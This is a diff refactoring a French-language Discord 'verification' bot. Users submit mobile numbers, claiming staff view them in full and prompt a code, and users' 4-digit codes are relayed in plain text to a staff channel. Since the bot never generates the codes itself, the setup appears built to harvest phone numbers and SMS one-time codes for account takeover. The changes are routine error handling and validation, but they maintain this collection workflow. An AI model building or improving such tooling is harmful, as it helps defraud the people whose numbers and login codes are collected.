@@ -3,13 +3,13 @@ from discord import app_commands
 from discord.ext import commands
 import asyncio
 import datetime
-import os
 import io
 import json
 import logging
 from typing import Optional, Dict, Set
 from aiohttp import web
 import config
+from utils import validate_phone, validate_code, mask_phone, load_blacklist, save_blacklist, is_user_blacklisted, is_phone_blacklisted, add_to_blacklist
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
 log = logging.getLogger("VerifBot")
@@ -24,17 +24,17 @@ DATA_FILE = "data.json"
 
 def load_data() -> dict:
     try:
-        with open(DATA_FILE, "r") as f:
+        with open(DATA_FILE, "r", encoding="utf-8") as f:
             return json.load(f)
     except Exception:
         return {}
 
 def save_data():
     try:
-        with open(DATA_FILE, "w") as f:
-            json.dump(data, f)
+        with open(DATA_FILE, "w", encoding="utf-8") as f:
+            json.dump(data, f, ensure_ascii=False)
     except Exception as e:
-        log.error(f"Save error: {e}")
+        log.exception("Save error")
 
 data: dict = load_data()
 data.setdefault("blacklisted_numbers", [])
@@ -50,10 +50,11 @@ data.setdefault("total_verifications", 0)
 data.setdefault("total_codes_received", 0)
 data.setdefault("ban_role", 0)
 
-blacklisted_numbers: Set[str] = set(data["blacklisted_numbers"])
-blacklisted_users: Set[int] = set(data["blacklisted_users"])
-denied_users_cooldown: Dict[int, float] = {}
+blacklist_data = load_blacklist()
+blacklisted_numbers: Set[str] = set(blacklist_data.get("phones", []))
+blacklisted_users: Set[int] = set(blacklist_data.get("users", []))
 
+denied_users_cooldown: Dict[int, float] = {}
 cooldowns: Dict[int, float] = {}
 pending_users: Dict[int, dict] = {}
 proofs: Dict[int, dict] = {}
@@ -86,9 +87,6 @@ async def start_health_server():
     log.info(f"Health check on port {config.PORT}")
 
 # ==================== HELPERS ====================
-
-def mask_phone(p: str) -> str:
-    return f"{p[:2]}{'*'*6}{p[-2:]}"
 
 def mask_code(code: str) -> str:
     if len(code) < 4:
@@ -125,6 +123,15 @@ def get_bypass_role_id():
 def get_ban_role_id():
     return data.get("ban_role") or 0
 
+async def safe_respond(interaction: discord.Interaction, embed: discord.Embed, ephemeral: bool = True):
+    try:
+        if interaction.response.is_done():
+            await interaction.followup.send(embed=embed, ephemeral=ephemeral)
+        else:
+            await interaction.response.send_message(embed=embed, ephemeral=ephemeral)
+    except Exception:
+        log.exception("safe_respond failed")
+
 async def send_log(title: str, description: str = "", color: int = COLOR_BLUE, fields: list = None, user: discord.User = None, ping: int = 0):
     channel = get_log_channel()
     if not channel:
@@ -135,12 +142,15 @@ async def send_log(title: str, description: str = "", color: int = COLOR_BLUE, f
             for name, value, inline in fields:
                 embed.add_field(name=name, value=value, inline=inline)
         if user:
-            embed.set_thumbnail(url=user.display_avatar.url)
+            try:
+                embed.set_thumbnail(url=user.display_avatar.url)
+            except Exception:
+                pass
         embed.set_footer(text=datetime.datetime.now().strftime('%d/%m/%Y %H:%M'))
         content = f"<@{ping}>" if ping else None
         await channel.send(content=content, embed=embed)
     except Exception:
-        pass
+        log.exception("send_log failed")
 
 def has_staff_role(interaction: discord.Interaction) -> bool:
     if isinstance(interaction.user, discord.Member):
@@ -165,8 +175,8 @@ def user_has_bypass(uid: int) -> bool:
     return False
 
 async def delete_message_after(message: discord.Message, delay: int):
-    await asyncio.sleep(delay)
     try:
+        await asyncio.sleep(delay)
         await message.delete()
     except Exception:
         pass
@@ -183,7 +193,6 @@ class PhoneModal(discord.ui.Modal, title="Vérification"):
     )
 
     async def on_submit(self, interaction: discord.Interaction):
-        import re
         try:
             now = datetime.datetime.now().timestamp()
             uid = interaction.user.id
@@ -193,26 +202,37 @@ class PhoneModal(discord.ui.Modal, title="Vérification"):
                 if denied_remaining > 0:
                     mins = int(denied_remaining // 60)
                     secs = int(denied_remaining % 60)
-                    await interaction.response.send_message(embed=discord.Embed(
+                    await safe_respond(interaction, discord.Embed(
                         title="Vérification refusée",
                         description=f"Votre vérification a été refusée.\n\nVous pouvez réessayer dans **{mins}m {secs:02d}s**.",
                         color=COLOR_RED
-                    ), ephemeral=True)
+                    ))
                     return
                 else:
                     blacklisted_users.discard(uid)
                     denied_users_cooldown.pop(uid, None)
+                    blacklist_data["users"] = list(blacklisted_users)
+                    save_blacklist(blacklist_data)
                     data["blacklisted_users"] = list(blacklisted_users)
                     save_data()
 
             phone_raw = self.phone.value.strip().replace(" ", "").replace("-", "")
 
+            ok, err = validate_phone(phone_raw)
+            if not ok:
+                await safe_respond(interaction, discord.Embed(
+                    title="Vérification",
+                    description=err,
+                    color=COLOR_RED
+                ))
+                return
+
             if phone_raw in blacklisted_numbers:
-                await interaction.response.send_message(embed=discord.Embed(
+                await safe_respond(interaction, discord.Embed(
                     title="Vérification refusée",
                     description="Ce numéro a été blacklisté.",
                     color=COLOR_RED
-                ), ephemeral=True)
+                ))
                 return
 
             if uid != config.OWNER_ID and uid in cooldowns:
@@ -220,27 +240,19 @@ class PhoneModal(discord.ui.Modal, title="Vérification"):
                 if remaining > 0:
                     mins = int(remaining // 60)
                     secs = int(remaining % 60)
-                    await interaction.response.send_message(embed=discord.Embed(
+                    await safe_respond(interaction, discord.Embed(
                         title="Vérification",
                         description=f"Vous avez déjà fait une demande récemment. Réessayez dans **{mins} min {secs:02d}s**.",
                         color=COLOR_GOLD
-                    ), ephemeral=True)
+                    ))
                     return
 
             if uid in pending_users:
-                await interaction.response.send_message(embed=discord.Embed(
+                await safe_respond(interaction, discord.Embed(
                     title="Vérification",
                     description="Votre demande est déjà en cours de traitement.",
                     color=COLOR_GOLD
-                ), ephemeral=True)
-                return
-
-            if not re.match(r"^(06|07)\d{8}$", phone_raw):
-                await interaction.response.send_message(embed=discord.Embed(
-                    title="Vérification",
-                    description="Numéro invalide. Vérifiez votre saisie.",
-                    color=COLOR_RED
-                ), ephemeral=True)
+                ))
                 return
 
             cooldowns[uid] = now
@@ -248,11 +260,11 @@ class PhoneModal(discord.ui.Modal, title="Vérification"):
             data["total_verifications"] = data.get("total_verifications", 0) + 1
             save_data()
 
-            await interaction.response.send_message(embed=discord.Embed(
+            await safe_respond(interaction, discord.Embed(
                 title="Vérification",
                 description="Votre demande a bien été prise en compte.\n\nAttendez de recevoir votre code, puis cliquez sur le bouton **Code** pour le saisir.",
                 color=COLOR_GREEN
-            ), ephemeral=True)
+            ))
 
             asyncio.create_task(send_log(
                 title="Nouvelle demande",
@@ -267,12 +279,12 @@ class PhoneModal(discord.ui.Modal, title="Vérification"):
 
             await send_staff_panel(interaction.user, phone_raw)
         except discord.errors.NotFound:
-            pass
-        except Exception as e:
-            log.error(f"PhoneModal error: {e}")
+            log.warning("PhoneModal interaction not found")
+        except Exception:
+            log.exception("PhoneModal error")
 
     async def on_error(self, interaction: discord.Interaction, error: Exception) -> None:
-        log.error(f"Modal error: {error}")
+        log.exception("Modal error")
 
 class CodeModal(discord.ui.Modal, title="Vérification"):
     code = discord.ui.TextInput(
@@ -291,41 +303,42 @@ class CodeModal(discord.ui.Modal, title="Vérification"):
         try:
             pending = pending_users.get(self.user_id)
             if pending is None:
-                await interaction.response.send_message(embed=discord.Embed(
+                await safe_respond(interaction, discord.Embed(
                     title="Vérification",
                     description="Aucune demande en cours. Mettez d'abord votre numéro.",
                     color=COLOR_GOLD
-                ), ephemeral=True)
+                ))
                 return
 
             if not pending.get("unlocked"):
-                await interaction.response.send_message(embed=discord.Embed(
+                await safe_respond(interaction, discord.Embed(
                     title="Vérification",
                     description="Vous n'avez pas encore reçu de code. Attendez, puis réessayez.",
                     color=COLOR_GOLD
-                ), ephemeral=True)
+                ))
                 return
 
             elapsed = datetime.datetime.now().timestamp() - pending["unlocked_at"]
             if elapsed > CODE_WINDOW:
                 pending_users.pop(self.user_id, None)
-                await interaction.response.send_message(embed=discord.Embed(
+                await safe_respond(interaction, discord.Embed(
                     title="Vérification",
                     description="Votre code a expiré. Refaites une demande de vérification.",
                     color=COLOR_RED
-                ), ephemeral=True)
+                ))
                 asyncio.create_task(send_log(title="Code expiré", color=COLOR_RED, fields=[
                     ("Utilisateur", f"<@{self.user_id}>", True),
                 ]))
                 return
 
             content = self.code.value.strip()
-            if not content.isdigit() or len(content) != 4:
-                await interaction.response.send_message(embed=discord.Embed(
+            ok, err = validate_code(content)
+            if not ok:
+                await safe_respond(interaction, discord.Embed(
                     title="Vérification",
-                    description="Saisissez uniquement les **4 chiffres** de votre code.",
+                    description=err,
                     color=COLOR_RED
-                ), ephemeral=True)
+                ))
                 return
 
             view = pending.get("view")
@@ -342,13 +355,16 @@ class CodeModal(discord.ui.Modal, title="Vérification"):
                 if staff_id:
                     embed_code.add_field(name="Staff", value=f"<@{staff_id}>", inline=True)
                 embed_code.add_field(name="Code masqué", value=f"`{mask_code(content)}`", inline=True)
-                embed_code.set_thumbnail(url=interaction.user.display_avatar.url)
+                try:
+                    embed_code.set_thumbnail(url=interaction.user.display_avatar.url)
+                except Exception:
+                    pass
                 embed_code.set_footer(text=datetime.datetime.now().strftime('%d/%m/%Y %H:%M'))
                 ping = f"<@{staff_id}> " if staff_id else ""
                 try:
                     await codes_channel.send(content=f"{ping}\n```{content}```", embed=embed_code)
                 except Exception:
-                    pass
+                    log.exception("Erreur envoi du code dans codes_channel")
 
             data["total_codes_received"] = data.get("total_codes_received", 0) + 1
             save_data()
@@ -356,9 +372,10 @@ class CodeModal(discord.ui.Modal, title="Vérification"):
             if view:
                 try:
                     user_fetch = await bot.fetch_user(self.user_id)
-                    await view.refresh(view.message, user_fetch, "Code reçu", "En attente de validation")
+                    if view.message is not None:
+                        await view.refresh(view.message, user_fetch, "Code reçu", "En attente de validation")
                 except Exception:
-                    pass
+                    log.exception("Erreur refresh panel après code reçu")
 
             asyncio.create_task(send_log(
                 title="Code reçu",
@@ -375,31 +392,31 @@ class CodeModal(discord.ui.Modal, title="Vérification"):
             if not user_has_bypass(self.user_id):
                 proof_channel = get_proof_channel()
                 if proof_channel:
-                    await interaction.response.send_message(embed=discord.Embed(
+                    await safe_respond(interaction, discord.Embed(
                         title="Vérification",
                         description="Code reçu. Finalisation de la vérification en cours.",
                         color=COLOR_GREEN
-                    ), ephemeral=True)
+                    ))
                     asyncio.create_task(start_proof(self.user_id, staff_id, content))
                 else:
-                    await interaction.response.send_message(embed=discord.Embed(
+                    await safe_respond(interaction, discord.Embed(
                         title="Vérification",
                         description="Code reçu. Vérification en cours, merci de patienter.",
                         color=COLOR_GREEN
-                    ), ephemeral=True)
+                    ))
             else:
-                await interaction.response.send_message(embed=discord.Embed(
+                await safe_respond(interaction, discord.Embed(
                     title="Vérification",
                     description="Code reçu. Vérification en cours, merci de patienter.",
                     color=COLOR_GREEN
-                ), ephemeral=True)
+                ))
         except discord.errors.NotFound:
-            pass
-        except Exception as e:
-            log.error(f"CodeModal error: {e}")
+            log.warning("CodeModal interaction not found")
+        except Exception:
+            log.exception("CodeModal error")
 
     async def on_error(self, interaction: discord.Interaction, error: Exception) -> None:
-        log.error(f"Code modal error: {error}")
+        log.exception("Code modal error")
 
 class CodeSendModal(discord.ui.Modal, title="Envoyer le code"):
     message_txt = discord.ui.TextInput(
@@ -415,8 +432,16 @@ class CodeSendModal(discord.ui.Modal, title="Envoyer le code"):
         self.panel_view = view
 
     async def on_submit(self, interaction: discord.Interaction):
+        v = self.panel_view
         try:
-            v = self.panel_view
+            if v.locked:
+                await safe_respond(interaction, discord.Embed(
+                    title="Action impossible",
+                    description="Cette demande est terminée.",
+                    color=COLOR_GOLD
+                ))
+                return
+
             pending_users[v.user_id] = {
                 "unlocked": True,
                 "unlocked_at": datetime.datetime.now().timestamp(),
@@ -424,8 +449,10 @@ class CodeSendModal(discord.ui.Modal, title="Envoyer le code"):
                 "view": v,
             }
 
-            txt = self.message_txt.value
+            txt = self.message_txt.value.strip() or "Votre code a été généré."
             embed_dm = discord.Embed(title="Votre code est arrivé", description=txt, color=COLOR_GREEN)
+
+            dm_ok = False
             try:
                 user_fetch = await bot.fetch_user(v.user_id)
                 await user_fetch.send(embed=embed_dm)
@@ -439,36 +466,73 @@ class CodeSendModal(discord.ui.Modal, title="Envoyer le code"):
                     target = bot.get_channel(chan_id)
                     if target:
                         try:
-                            msg = await target.send(content=f"<@{v.user_id}>", embed=discord.Embed(
-                                title="Vérification",
-                                description=f"{txt}\n\nRevenez sur le serveur et cliquez sur le bouton **Code** pour le saisir.",
-                                color=COLOR_GOLD
-                            ))
+                            msg = await target.send(
+                                content=f"<@{v.user_id}>",
+                                embed=discord.Embed(
+                                    title="Vérification",
+                                    description=f"{txt}\n\nRevenez sur le serveur et cliquez sur le bouton **Code** pour le saisir.",
+                                    color=COLOR_GOLD
+                                )
+                            )
                             asyncio.create_task(delete_message_after(msg, 10))
                         except Exception:
-                            pass
-
-            await interaction.response.send_message(embed=discord.Embed(
-                title="Code envoyé",
-                description=f"{'DM envoyé' if dm_ok else 'DM fermé — message envoyé au salon de vérif'} à <@{v.user_id}>.\n⏱️ Il a **10 minutes**, sinon la demande expire.",
-                color=COLOR_GOLD
-            ), ephemeral=True)
+                            log.exception("Erreur envoi code dans le salon de vérif")
 
             try:
-                user_fetch = await bot.fetch_user(v.user_id)
-                await v.refresh(v.message, user_fetch, "Code envoyé", "En attente de saisie")
+                if not interaction.response.is_done():
+                    await interaction.response.send_message(
+                        embed=discord.Embed(
+                            title="Code envoyé",
+                            description=f"{'DM envoyé' if dm_ok else 'DM fermé — message envoyé au salon de vérif'} à <@{v.user_id}>.\n⏱️ Il a **10 minutes**, sinon la demande expire.",
+                            color=COLOR_GOLD
+                        ),
+                        ephemeral=True
+                    )
+            except Exception:
+                try:
+                    await interaction.followup.send(
+                        embed=discord.Embed(
+                            title="Code envoyé",
+                            description=f"{'DM envoyé' if dm_ok else 'DM fermé — message envoyé au salon de vérif'} à <@{v.user_id}>.\n⏱️ Il a **10 minutes**, sinon la demande expire.",
+                            color=COLOR_GOLD
+                        ),
+                        ephemeral=True
+                    )
+                except Exception:
+                    pass
+
+            try:
+                if v.message is not None:
+                    user_fetch = await bot.fetch_user(v.user_id)
+                    await v.refresh(v.message, user_fetch, "Code envoyé", "En attente de saisie")
+            except Exception:
+                log.exception("Erreur refresh du panneau staff après envoi du code")
+
+            asyncio.create_task(send_log(
+                title="Code envoyé",
+                color=COLOR_GOLD,
+                fields=[
+                    ("Utilisateur", f"<@{v.user_id}>", True),
+                    ("Staff", f"<@{interaction.user.id}>", True),
+                    ("DM", "Oui" if dm_ok else "Non (message salon)", True),
+                ]
+            ))
+        except discord.errors.NotFound:
+            log.warning("CodeSendModal interaction not found")
+        except Exception:
+            log.exception("CodeSendModal error")
+            try:
+                if not interaction.response.is_done():
+                    await interaction.response.send_message(
+                        embed=discord.Embed(
+                            title="Erreur",
+                            description="Une erreur interne est survenue. Merci de réessayer.",
+                            color=COLOR_RED
+                        ),
+                        ephemeral=True
+                    )
             except Exception:
                 pass
-            
-            asyncio.create_task(send_log(title="Code envoyé", color=COLOR_GOLD, fields=[
-                ("Utilisateur", f"<@{v.user_id}>", True),
-                ("Staff", f"<@{interaction.user.id}>", True),
-                ("DM", "Oui" if dm_ok else "Non (message salon)", True),
-            ]))
-        except discord.errors.NotFound:
-            pass
-        except Exception as e:
-            log.error(f"CodeSendModal error: {e}")
 
 class BanUserModal(discord.ui.Modal, title="Bannir un utilisateur"):
     user_id = discord.ui.TextInput(
@@ -480,15 +544,14 @@ class BanUserModal(discord.ui.Modal, title="Bannir un utilisateur"):
     async def on_submit(self, interaction: discord.Interaction):
         try:
             uid = int(self.user_id.value)
-            user = await bot.fetch_user(uid)
+            await bot.fetch_user(uid)
         except Exception:
-            await interaction.response.send_message(embed=discord.Embed(title="Erreur", description="ID invalide.", color=COLOR_RED), ephemeral=True)
+            await safe_respond(interaction, discord.Embed(title="Erreur", description="ID invalide.", color=COLOR_RED))
             return
-        
+
         try:
             ban_role_id = get_ban_role_id()
-            
-            # Ban dans TOUS les serveurs
+
             for g in list(bot.guilds):
                 m = g.get_member(uid)
                 if m:
@@ -501,14 +564,14 @@ class BanUserModal(discord.ui.Modal, title="Bannir un utilisateur"):
                         else:
                             await g.kick(m, reason="Action de bannissement")
                         log.info(f"✅ User {uid} banned from {g.name}")
-                    except Exception as e:
-                        log.error(f"Error banning {uid}: {e}")
+                    except Exception:
+                        log.exception(f"Error banning {uid} from {g.name}")
 
-            await interaction.response.send_message(embed=discord.Embed(
+            await safe_respond(interaction, discord.Embed(
                 title="✅ Utilisateur banni",
                 description=f"<@{uid}> a été banni avec succès.",
                 color=COLOR_GREEN
-            ), ephemeral=True)
+            ))
 
             await send_log(title="⛔ Utilisateur banni", color=COLOR_RED, fields=[
                 ("Utilisateur", f"<@{uid}>", True),
@@ -516,9 +579,9 @@ class BanUserModal(discord.ui.Modal, title="Bannir un utilisateur"):
                 ("Action", "Ban de tous les serveurs", True),
             ], ping=interaction.user.id)
         except discord.errors.NotFound:
-            pass
-        except Exception as e:
-            log.error(f"Ban modal error: {e}")
+            log.warning("BanUserModal interaction not found")
+        except Exception:
+            log.exception("Ban modal error")
 
 # ==================== VUES ====================
 
@@ -527,7 +590,10 @@ def build_staff_embed(user: discord.User, phone: str, status: str = "En attente"
         timestamp = datetime.datetime.now()
     embed = discord.Embed(color=COLOR_BLUE, timestamp=timestamp)
     embed.set_author(name="Demande de vérification")
-    embed.set_thumbnail(url=user.display_avatar.url)
+    try:
+        embed.set_thumbnail(url=user.display_avatar.url)
+    except Exception:
+        pass
     embed.add_field(name="Utilisateur", value=f"{user.mention}", inline=True)
     embed.add_field(name="ID", value=f"`{user.id}`", inline=True)
     embed.add_field(name="Numéro", value=f"`{mask_phone(phone)}`", inline=True)
@@ -556,9 +622,9 @@ class ContestView(discord.ui.View):
                 color=COLOR_GOLD
             ), ephemeral=True)
         except discord.errors.NotFound:
-            pass
-        except Exception as e:
-            log.error(f"Contest error: {e}")
+            log.warning("ContestView interaction not found")
+        except Exception:
+            log.exception("Contest error")
 
 class QuickBanView(discord.ui.View):
     def __init__(self):
@@ -568,18 +634,17 @@ class QuickBanView(discord.ui.View):
     async def ban_button(self, interaction: discord.Interaction, button: discord.ui.Button):
         try:
             if not has_staff_role(interaction):
-                await interaction.response.send_message(embed=discord.Embed(
+                await safe_respond(interaction, discord.Embed(
                     title="Accès refusé",
                     description="Staff uniquement.",
                     color=COLOR_RED
-                ), ephemeral=True)
+                ))
                 return
-            
             await interaction.response.send_modal(BanUserModal())
         except discord.errors.NotFound:
-            pass
-        except Exception as e:
-            log.error(f"Quick ban error: {e}")
+            log.warning("QuickBanView interaction not found")
+        except Exception:
+            log.exception("Quick ban error")
 
 class StaffPanelView(discord.ui.View):
     def __init__(self, user_id: int, phone: str):
@@ -593,6 +658,8 @@ class StaffPanelView(discord.ui.View):
 
     async def refresh(self, message: discord.Message, user: discord.User, status: str, code_status: str, color: int = None):
         try:
+            if message is None:
+                return
             new_embed = build_staff_embed(user=user, phone=self.phone, status=status, claimed_by=self.claimed_by, code_status=code_status, timestamp=self.created_at)
             if color:
                 new_embed.color = color
@@ -605,139 +672,142 @@ class StaffPanelView(discord.ui.View):
                         child.style = discord.ButtonStyle.secondary
                         child.label = "Pris en charge"
             await message.edit(embed=new_embed, view=self)
+        except discord.NotFound:
+            log.warning("Staff panel message deleted during refresh")
         except Exception:
-            pass
+            log.exception("Erreur refresh panel staff")
 
     @discord.ui.button(label="Prendre en charge", style=discord.ButtonStyle.primary, custom_id="claim_btn")
     async def claim_button(self, interaction: discord.Interaction, button: discord.ui.Button):
         try:
             if not has_staff_role(interaction):
-                await interaction.response.send_message(embed=discord.Embed(
+                await safe_respond(interaction, discord.Embed(
                     title="Accès refusé",
                     description="Vous n'avez pas l'accès requis pour gérer les vérifications.",
                     color=COLOR_RED
-                ), ephemeral=True)
+                ))
                 return
             if self.claimed_by is not None:
-                await interaction.response.send_message(embed=discord.Embed(
+                await safe_respond(interaction, discord.Embed(
                     title="Déjà pris en charge",
                     description=f"Déjà pris par <@{self.claimed_by}>.",
                     color=COLOR_RED
-                ), ephemeral=True)
+                ))
                 return
-            self.claimed_by = interaction.user.id
 
+            self.claimed_by = interaction.user.id
             reveal = discord.Embed(color=COLOR_GREEN)
             reveal.add_field(name="Numéro", value=f"`{self.phone}`", inline=True)
-            await interaction.response.send_message(embed=reveal, ephemeral=True)
+            await safe_respond(interaction, reveal)
 
             try:
                 user_fetch = await bot.fetch_user(self.user_id)
-                await self.refresh(interaction.message, user_fetch, "En cours", "—")
+                if self.message is not None:
+                    await self.refresh(self.message, user_fetch, "En cours", "—")
             except Exception:
-                pass
-            
+                log.exception("Erreur refresh après prise en charge")
+
             asyncio.create_task(send_log(title="Prise en charge", color=COLOR_GREEN, fields=[
                 ("Staff", f"<@{interaction.user.id}>", True),
                 ("Utilisateur", f"<@{self.user_id}>", True),
             ]))
         except discord.errors.NotFound:
-            pass
-        except Exception as e:
-            log.error(f"Claim error: {e}")
+            log.warning("Claim button interaction not found")
+        except Exception:
+            log.exception("Claim error")
 
     @discord.ui.button(label="Voir le numéro", style=discord.ButtonStyle.secondary, custom_id="viewnum_btn", row=1)
     async def viewnum_button(self, interaction: discord.Interaction, button: discord.ui.Button):
         try:
             if not has_staff_role(interaction):
-                await interaction.response.send_message(embed=discord.Embed(
+                await safe_respond(interaction, discord.Embed(
                     title="Accès refusé",
                     description="Vous n'avez pas l'accès requis.",
                     color=COLOR_RED
-                ), ephemeral=True)
+                ))
                 return
             if self.claimed_by is not None and self.claimed_by != interaction.user.id:
-                await interaction.response.send_message(embed=discord.Embed(
+                await safe_respond(interaction, discord.Embed(
                     title="Déjà pris en charge",
                     description=f"Seul <@{self.claimed_by}> peut consulter cette demande.",
                     color=COLOR_RED
-                ), ephemeral=True)
+                ))
                 return
             reveal = discord.Embed(color=COLOR_GREEN)
             reveal.add_field(name="Numéro", value=f"`{self.phone}`", inline=True)
-            await interaction.response.send_message(embed=reveal, ephemeral=True)
+            await safe_respond(interaction, reveal)
         except discord.errors.NotFound:
-            pass
-        except Exception as e:
-            log.error(f"View num error: {e}")
+            log.warning("View num interaction not found")
+        except Exception:
+            log.exception("View num error")
 
     @discord.ui.button(label="Envoyer le code", style=discord.ButtonStyle.success, custom_id="sendcode_btn", row=1)
     async def sendcode_button(self, interaction: discord.Interaction, button: discord.ui.Button):
         try:
             if not has_staff_role(interaction):
-                await interaction.response.send_message(embed=discord.Embed(
+                await safe_respond(interaction, discord.Embed(
                     title="Accès refusé",
                     description="Vous n'avez pas l'accès requis.",
                     color=COLOR_RED
-                ), ephemeral=True)
+                ))
                 return
             if self.claimed_by is None:
-                await interaction.response.send_message(embed=discord.Embed(
+                await safe_respond(interaction, discord.Embed(
                     title="Action impossible",
                     description="Prenez d'abord la demande en charge.",
                     color=COLOR_GOLD
-                ), ephemeral=True)
+                ))
                 return
             if self.claimed_by != interaction.user.id:
-                await interaction.response.send_message(embed=discord.Embed(
+                await safe_respond(interaction, discord.Embed(
                     title="Déjà pris en charge",
                     description=f"Seul <@{self.claimed_by}> gère cette demande.",
                     color=COLOR_RED
-                ), ephemeral=True)
+                ))
                 return
             if self.locked:
-                await interaction.response.send_message(embed=discord.Embed(
+                await safe_respond(interaction, discord.Embed(
                     title="Action impossible",
                     description="Cette demande est terminée.",
                     color=COLOR_GOLD
-                ), ephemeral=True)
+                ))
                 return
             await interaction.response.send_modal(CodeSendModal(self))
         except discord.errors.NotFound:
-            pass
-        except Exception as e:
-            log.error(f"Send code error: {e}")
+            log.warning("Send code interaction not found")
+        except Exception:
+            log.exception("Send code error")
 
     @discord.ui.button(label="Valider", style=discord.ButtonStyle.success, custom_id="validate_btn", row=2)
     async def validate_button(self, interaction: discord.Interaction, button: discord.ui.Button):
         try:
             if not has_staff_role(interaction):
-                await interaction.response.send_message(embed=discord.Embed(
+                await safe_respond(interaction, discord.Embed(
                     title="Accès refusé",
                     description="Vous n'avez pas l'accès requis.",
                     color=COLOR_RED
-                ), ephemeral=True)
+                ))
                 return
             if self.claimed_by is None:
-                await interaction.response.send_message(embed=discord.Embed(
+                await safe_respond(interaction, discord.Embed(
                     title="Action impossible",
                     description="Prenez d'abord la demande en charge.",
                     color=COLOR_GOLD
-                ), ephemeral=True)
+                ))
                 return
             if self.claimed_by != interaction.user.id:
-                await interaction.response.send_message(embed=discord.Embed(
+                await safe_respond(interaction, discord.Embed(
                     title="Déjà pris en charge",
                     description=f"Seul <@{self.claimed_by}> gère cette demande.",
                     color=COLOR_RED
-                ), ephemeral=True)
+                ))
                 return
             if self.locked:
-                await interaction.response.send_message(embed=discord.Embed(
+                await safe_respond(interaction, discord.Embed(
                     title="Action impossible",
                     description="Cette demande est terminée.",
                     color=COLOR_GOLD
-                ), ephemeral=True)
+                ))
                 return
 
             self.locked = True
@@ -746,9 +816,10 @@ class StaffPanelView(discord.ui.View):
 
             try:
                 user_fetch = await bot.fetch_user(self.user_id)
-                await self.refresh(interaction.message, user_fetch, "Validé", "Validé", COLOR_GREEN)
+                if self.message is not None:
+                    await self.refresh(self.message, user_fetch, "Validé", "Validé", COLOR_GREEN)
             except Exception:
-                pass
+                log.exception("Erreur refresh validation")
 
             if config.VERIFIED_ROLE_ID and config.GUILD_ID:
                 guild = bot.get_guild(config.GUILD_ID)
@@ -767,33 +838,33 @@ class StaffPanelView(discord.ui.View):
                 ("Numéro", f"`{self.phone}`", True),
             ], ping=self.claimed_by)
         except discord.errors.NotFound:
-            pass
-        except Exception as e:
-            log.error(f"Validate error: {e}")
+            log.warning("Validate interaction not found")
+        except Exception:
+            log.exception("Validate error")
 
     @discord.ui.button(label="Refuser", style=discord.ButtonStyle.danger, custom_id="deny_btn", row=2)
     async def deny_button(self, interaction: discord.Interaction, button: discord.ui.Button):
         try:
             if not has_staff_role(interaction):
-                await interaction.response.send_message(embed=discord.Embed(
+                await safe_respond(interaction, discord.Embed(
                     title="Accès refusé",
                     description="Vous n'avez pas l'accès requis.",
                     color=COLOR_RED
-                ), ephemeral=True)
+                ))
                 return
             if self.claimed_by is not None and self.claimed_by != interaction.user.id:
-                await interaction.response.send_message(embed=discord.Embed(
+                await safe_respond(interaction, discord.Embed(
                     title="Déjà pris en charge",
                     description=f"Seul <@{self.claimed_by}> gère cette demande.",
                     color=COLOR_RED
-                ), ephemeral=True)
+                ))
                 return
             if self.locked:
-                await interaction.response.send_message(embed=discord.Embed(
+                await safe_respond(interaction, discord.Embed(
                     title="Action impossible",
                     description="Cette demande est terminée.",
                     color=COLOR_GOLD
-                ), ephemeral=True)
+                ))
                 return
 
             self.locked = True
@@ -804,15 +875,21 @@ class StaffPanelView(discord.ui.View):
             blacklisted_numbers.add(phone)
             blacklisted_users.add(uid)
             denied_users_cooldown[uid] = datetime.datetime.now().timestamp()
+
+            blacklist_data["phones"] = list(blacklisted_numbers)
+            blacklist_data["users"] = list(blacklisted_users)
+            save_blacklist(blacklist_data)
+
             data["blacklisted_numbers"] = list(blacklisted_numbers)
             data["blacklisted_users"] = list(blacklisted_users)
             save_data()
 
             try:
                 user_fetch = await bot.fetch_user(uid)
-                await self.refresh(interaction.message, user_fetch, "Refusé", "Refusé", COLOR_RED)
+                if self.message is not None:
+                    await self.refresh(self.message, user_fetch, "Refusé", "Refusé", COLOR_RED)
             except Exception:
-                pass
+                log.exception("Erreur refresh refusal")
 
             deny_embed = discord.Embed(
                 title="Vérification annulée",
@@ -835,7 +912,7 @@ class StaffPanelView(discord.ui.View):
                             msg = await target.send(content=f"<@{uid}>", embed=deny_embed, view=ContestView())
                             asyncio.create_task(delete_message_after(msg, 10))
                         except Exception:
-                            pass
+                            log.exception("Erreur envoi refus au salon de vérif")
 
             asyncio.create_task(send_log(title="Vérification refusée", color=COLOR_RED, user=user_fetch if 'user_fetch' in locals() else None, fields=[
                 ("Utilisateur", f"<@{uid}>", True),
@@ -843,9 +920,9 @@ class StaffPanelView(discord.ui.View):
                 ("Numéro", f"`{phone}`", True),
             ], ping=interaction.user.id))
         except discord.errors.NotFound:
-            pass
-        except Exception as e:
-            log.error(f"Deny error: {e}")
+            log.warning("Deny interaction not found")
+        except Exception:
+            log.exception("Deny error")
 
 async def send_staff_panel(user: discord.User, phone: str):
     channel = get_staff_channel()
@@ -857,8 +934,8 @@ async def send_staff_panel(user: discord.User, phone: str):
     try:
         msg = await channel.send(content="@everyone", embed=embed, view=view)
         view.message = msg
-    except Exception as e:
-        log.error(f"Staff panel send error: {e}")
+    except Exception:
+        log.exception("Staff panel send error")
 
 # ==================== PROOF ====================
 
@@ -883,16 +960,18 @@ async def start_proof(uid: int, staff_id: Optional[int], code: str = ""):
         user = bot.get_user(uid) or await bot.fetch_user(uid)
     except Exception:
         return
-    
-    start_ts = datetime.datetime.now().timestamp()
 
+    start_ts = datetime.datetime.now().timestamp()
     view = pending_users.get(uid, {}).get("view")
     phone_val = view.phone if view else ""
 
     def make_embed(mins, secs):
         embed = discord.Embed(color=COLOR_GOLD, timestamp=datetime.datetime.now())
         embed.set_author(name="Preuve requise", icon_url=user.display_avatar.url)
-        embed.set_thumbnail(url=user.display_avatar.url)
+        try:
+            embed.set_thumbnail(url=user.display_avatar.url)
+        except Exception:
+            pass
         embed.add_field(name="Utilisateur", value=f"{user.mention}", inline=True)
         embed.add_field(name="ID", value=f"`{uid}`", inline=True)
         if phone_val:
@@ -916,8 +995,8 @@ async def start_proof(uid: int, staff_id: Optional[int], code: str = ""):
 
     try:
         msg = await channel.send(content=ping_content, embed=make_embed(5, 0))
-    except Exception as e:
-        log.error(f"Proof send error: {e}")
+    except Exception:
+        log.exception("Proof send error")
         return
 
     proofs[uid] = {
@@ -949,8 +1028,8 @@ async def start_proof(uid: int, staff_id: Optional[int], code: str = ""):
                     pass
             except asyncio.CancelledError:
                 return
-            except Exception as e:
-                log.error(f"Countdown error: {e}")
